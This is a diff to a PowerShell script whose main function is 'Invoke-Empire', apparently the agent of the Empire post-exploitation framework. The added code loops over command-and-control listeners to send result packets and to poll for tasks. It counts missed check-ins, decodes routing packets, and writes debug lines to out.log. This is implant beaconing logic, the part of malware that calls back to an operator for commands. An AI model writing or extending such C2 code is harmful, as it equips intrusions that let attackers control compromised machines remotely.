@@ -769,13 +769,33 @@ function Invoke-Empire {
 		$script:listeners = $newlisteners
 	}
 
+	# send message function iterating through listeners
+	$script:SendMessage = {
+		param($Packets)
+		foreach ($Listener in $script:listeners){
 			SleepWithJitter($l)	
 			if ($JobResults) {
+				((& $Listener["send_func"] -Packets $Packets -FixedParameters $Listener["fixed_parameters"]))
 			}
 		}
 	}
 
 	$script:GetTask = {
+		foreach ($Listener in $script:listeners){
+			"calling getTask with listener" | Out-File "out.log" -Append -NoClobber
+			$Listener["name"]|Out-File "out.log" -Append -NoClobber
+
+			$TaskData = (& $Listener['get_task_func'] -FixedParameters $Listener["fixed_parameters"])
+			if (!$TaskData){
+				"no task data, increasing missedcheckins"|Out-File "out.log" -Append -NoClobber
+				$Listener['missedCheckins'] += 1
+			}
+			else {
+				if ([System.Text.Encoding]::UTF8.GetString($TaskData) -ne $Listener['defaultResponse']) {
+					"got something not equal to defaultResponse, calling decoderoutingpacket"|Out-File "out.log" -Append -NoClobber
+					Decode-RoutingPacket -PacketData $TaskData
+				}
+				break
 			}
 		}
 	}
